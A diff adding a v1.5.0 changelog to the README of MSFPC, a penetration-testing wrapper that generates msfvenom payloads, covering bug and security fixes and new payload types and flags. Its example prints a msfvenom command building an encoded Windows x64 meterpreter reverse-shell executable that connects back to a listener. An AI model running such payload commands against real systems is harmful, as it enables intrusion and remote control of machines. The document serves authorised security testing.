@@ -257,7 +257,111 @@ _Note: Removed WAN IP._
 
 ## To-Do List
 
-* Shellcode generation
-* x64 payloads
-* IPv6 support
+* ~~Shellcode generation~~ _(done in v1.5.0 — `raw`/`bin` type)_
+* ~~x64 payloads~~ _(done in v1.4.5)_
+* ~~IPv6 support~~ _(done in v1.5.0)_
 * Look into using OS scripting more _(`powershell_bind_tcp` & `bind_perl` etc)_
+
+
+- - -
+
+
+## v1.5.0 — Exegol Fork Changelog
+
+Major rewrite focused on bug fixes, security hardening, and new features.
+
+### Bug Fixes
+
+| # | Severity | Description |
+|---|----------|-------------|
+| 1 | **Critical** | IP menu always overrode selection with WAN IP (`"${INPUT}" == "${INPUT}"` was always true) |
+| 2 | **Critical** | Duplicate short flags (`-p` for both `--platform` and `--port`, `-t` for both `--type` and `--tcp`) — second definition was unreachable |
+| 3 | **Critical** | `--shell` flag conflict — `--shell` appeared in both `--cmd` group and standalone, making `--shell <value>` impossible |
+| 4 | **Critical** | `--all` flag conflict — matched `find_port` before `batch`, making `--all` for batch mode unreachable |
+| 5 | **High** | Tomcat `find_port` check compared against `"find_ports"` (with trailing `s`) — never matched |
+| 6 | **High** | `exe-service` type was unreachable — not included in the Windows `elif` check |
+| 7 | **Medium** | Error message for invalid `--flag` printed wrong variable (`${x}` from positional loop instead of current flag) |
+| 8 | **Medium** | `PADDING` variable set in `doAction` leaked across calls in batch mode |
+| 9 | **Medium** | Port regex accepted negative numbers (`^-?[0-9]+$`) |
+| 10 | **Low** | `VERBOSE` checked before argument parsing (always false at WAN fetch) |
+
+### Security Fixes
+
+| # | Issue | Fix |
+|---|-------|-----|
+| 1 | `eval "${CMD}"` with user-supplied IP/PORT — **command injection** | Replaced with direct array execution: `msfvenom "${MSFVENOM_ARGS[@]}"` |
+| 2 | Fixed `/tmp/msfpc.out` temp file — **symlink race (TOCTOU)** | Now uses `mktemp /tmp/msfpc.XXXXXX` |
+| 3 | `eval ${CMD} "${url}"` for WAN IP fetch | Replaced with array execution: `"${_FETCHCMD[@]}" "${url}"` |
+| 4 | Batch/loop used `eval "${0}"` for recursive calls | Replaced with `generatePayload` function — no subprocess/eval |
+| 5 | Install comment used `curl -k` (disables TLS verification) | Removed `-k` flag; WAN fetch URLs upgraded to HTTPS |
+
+### Refactoring
+
+- **Single `VERSION` variable** — no more version string repeated in 3 places
+- **Unified argument parser** — one `while/case` loop handles both `--flags` and positional keywords (was two separate loops with conflicts)
+- **`generatePayload()` function** — all payload type logic in one callable function; batch/loop call it directly instead of recursive `eval "${0}"`
+- **`doAction()` uses local variables** — no more global state leaks between calls
+- **NIC arrays reused** — IP menu uses existing `IFACE`/`IPs` arrays instead of re-scanning with `ifconfig`
+
+### New Features
+
+#### New Payload Types
+
+| Type | Extension | Description |
+|------|-----------|-------------|
+| `csharp` / `cs` | `.cs` | C# byte array (msfvenom `-f csharp`) |
+| `hta` | `.hta` | HTA file with PowerShell execution (msfvenom `-f hta-psh`) |
+| `vbscript` / `vbs` | `.vbs` | VBScript payload (msfvenom `-f vbs`) |
+| `raw` / `bin` | `.bin` | Raw shellcode (msfvenom `-f raw`) |
+
+#### New Flags
+
+| Flag | Description |
+|------|-------------|
+| `--encoder <name>` | Encoder to use (e.g. `x86/shikata_ga_nai`). Default: `generic/none` |
+| `--iterations <n>` | Number of encoding iterations |
+| `--output <path>` | Output directory for generated files |
+| `--format <fmt>` | Override output format (`raw`, `c`, `hex`, `csharp`, `base64`, etc.) |
+| `--dry-run` | Print msfvenom commands without executing them |
+| `--listen` | Auto-start `msfconsole` handler after payload generation |
+
+#### Architecture Support
+
+| Flag | Description |
+|------|-------------|
+| `--aarch64` / `arm64` | ARM 64-bit payloads (Linux) |
+| `x64` / `--x64` | 64-bit payloads _(already in v1.4.5)_ |
+
+#### Other
+
+- **IPv6 support** — IPv6 addresses detected in arguments, accepted in IP menu
+- **Config file (`~/.msfpcrc`)** — set persistent defaults for port, arch, encoder, method, direction, etc.
+- **Handler-only + dry-run skip msfvenom check** — no need for Metasploit to be installed to preview commands
+
+### Example — Dry Run with Encoder
+
+```bash
+$ msfpc --dry-run --encoder x86/shikata_ga_nai --iterations 3 windows x64 10.10.14.5
+ [*] MSFvenom Payload Creator (MSFPC v1.5.0)
+ [i]   IP: 10.10.14.5
+ [i] PORT: 443
+ [i] TYPE: windows (windows/x64/meterpreter/reverse_tcp)
+ [i]  CMD: msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe --platform windows -a x64 -e x86/shikata_ga_nai -i 3 LHOST=10.10.14.5 LPORT=443 > '.../windows-x64-meterpreter-staged-reverse-tcp-443.exe'
+
+ [i] Dry-run mode — command printed above, nothing executed
+```
+
+### Example — Config File (`~/.msfpcrc`)
+
+```ini
+# Default port
+port=4444
+# Default architecture
+arch=x64
+# Default encoder
+encoder=x86/shikata_ga_nai
+# Encoding iterations
+iterations=3
+# Always verbose
+verbose=true
+```
